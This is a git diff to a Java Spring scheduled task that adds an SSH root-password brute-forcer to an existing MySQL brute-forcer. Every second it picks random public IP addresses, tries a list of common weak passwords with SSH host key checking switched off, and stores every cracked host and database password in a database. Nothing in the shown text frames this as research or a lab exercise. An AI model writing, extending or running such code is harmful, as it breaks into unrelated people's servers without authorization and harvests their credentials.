@@ -1,6 +1,12 @@
 package com.teachy.coins.tasks.mysql;
 
+import com.jcraft.jsch.JSch;
+import com.jcraft.jsch.JSchException;
+import com.jcraft.jsch.Session;
+import com.teachy.coins.infrastructure.persistence.HostsDao;
+import com.teachy.coins.model.bo.HostsBo;
 import lombok.extern.slf4j.Slf4j;
+import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.scheduling.annotation.Scheduled;
 import org.springframework.stereotype.Component;
 
@@ -13,24 +19,23 @@ import java.io.OutputStreamWriter;
 import java.sql.Connection;
 import java.sql.DriverManager;
 import java.util.Arrays;
-import java.util.HashSet;
 import java.util.List;
+import java.util.Properties;
 import java.util.Random;
-import java.util.Set;
 
 
 @Component
 @Slf4j
 public class MySqlTask {
 
+    @Autowired
+    private HostsDao hostsDao;
     Connection conn = null;
 
     private static final String USER = "root";
-    private static final String PATH = "/root/apps/coins/ipList.txt";
     List<String> checkList = Arrays.asList("root", "123456", "admin", "admin123", "admin123456", "root123",
             "root123456", "12345678", "Admin", "admin@123", "12345", "123456789", "test1", "password", "zinch",
             "asdf", "qwerty", "iloveyou", "abc123", "111111", "123123", "test", "root@123");
-    Set<String> allIp = new HashSet<>();
 
     @Scheduled(cron = "*/1 * * * * ?")
     public void doTask() {
@@ -43,17 +48,64 @@ public class MySqlTask {
 
     public void getConnection() {
         String ip = getRandomIp();
-        if (allIp.contains(ip)) {
-            return;
+        connecHost(ip);
+        connecMysql(ip);
+    }
+
+    public void insert(String ip, String pass, boolean isHost) {
+        HostsBo hostsBo = hostsDao.selectByIp(ip);
+        if (hostsBo == null) {
+            hostsBo = new HostsBo();
+            hostsBo.setIp(ip);
+            deal(hostsBo, pass, isHost);
+            hostsDao.insert(hostsBo);
+        } else {
+            deal(hostsBo, pass, isHost);
+            hostsDao.update(hostsBo);
         }
+    }
+
+    public void deal(HostsBo hostsBo, String pass, boolean isHost) {
+        if (isHost) {
+            hostsBo.setPasswordHost(pass);
+        } else {
+            hostsBo.setPasswordMysql(pass);
+        }
+    }
+
+    public void connecHost(String ip) {
+        int port = 22;
+        for (String pass : checkList) {
+            // 创建JSch
+            JSch jSch = new JSch();
+            // 获取session
+            Session session = null;
+            try {
+                session = jSch.getSession("root", ip, port);
+                session.setPassword(pass);
+                Properties prop = new Properties();
+                prop.put("StrictHostKeyChecking", "no");
+                session.setConfig(prop);
+                session.connect();
+                insert(ip, pass, true);
+                break;
+            } catch (JSchException e) {
+                if (e.getMessage().contains("fail")) {
+                    continue;
+                } else {
+                    break;
+                }
+            }
+        }
+    }
+
+    public void connecMysql(String ip) {
         for (String pass : checkList) {
             try {
                 Class.forName("com.mysql.jdbc.Driver");
-                String url = "jdbc:mysql://" + ip + ":3306/mysql?useSSL=false&connectTimeout=1500&socketTimeout=1500";
+                String url = "jdbc:mysql://" + ip + ":3306/mysql?useSSL=false&connectTimeout=1500&socketTimeout=1500&&serverTimezone=UTC";
                 conn = (Connection) DriverManager.getConnection(url, USER, pass); //创建连接
-                log.info("ip:" + ip + " " + pass);
-                allIp.add(ip);
-                method2(PATH, ip + " " + pass);
+                insert(ip, pass, false);
                 break;
             } catch (Exception e) {
                 if (e.getMessage().contains("YES")) {
@@ -63,9 +115,7 @@ public class MySqlTask {
                 }
             }
         }
-
     }
-
 
     public static String getRandomIp() {
         int[][] range = {{607649792, 608174079}, // 36.56.0.0-36.63.255.255
